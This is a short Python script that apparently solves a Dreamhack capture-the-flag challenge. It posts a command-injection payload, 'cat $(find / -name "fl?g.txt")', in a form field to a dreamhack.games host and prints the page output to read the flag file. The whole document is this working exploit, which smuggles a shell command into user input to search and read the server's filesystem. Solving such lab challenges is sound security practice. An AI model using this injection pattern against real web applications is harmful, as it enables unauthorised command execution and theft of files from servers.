from requests import post
from bs4 import BeautifulSoup

url = "http://host3.dreamhack.games:14246/"

data = {"user_input": """cat $(find / -name "fl?g.txt")"""}

html = BeautifulSoup(post(url, data=data).text, "html.parser")
print(html.find("pre").get_text())
